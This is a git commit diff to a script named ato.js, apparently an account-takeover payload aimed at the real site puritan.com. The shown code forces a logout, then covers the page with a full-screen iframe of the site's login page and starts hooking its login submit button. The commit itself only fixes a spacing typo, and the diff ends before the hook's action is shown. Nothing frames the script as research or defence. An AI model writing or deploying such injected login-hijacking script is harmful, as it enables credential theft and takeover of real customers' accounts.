0fc893463020a89e703588d326bfd1df897e6336
bbpa <57352896+bbpa@users.noreply.github.com>
2024-05-24 03:23:21 +0330

    Update ato.js

--- ato.js
+++ ato.js
@@ -6,7 +6,7 @@ fetch("/login/logout", {
 window.setTimeout(()=>{
 let iframe=document.createElement("iframe");
 iframe.src="https://www.puritan.com/login"
-iframe. style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
+iframe.style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
 document.body.appendChild(iframe)
 iframe.contentWindow.addEventListener("DOMContentLoaded", () => {
 let loginbutton=iframe.contentWindow.document.getElementById("login_submit");
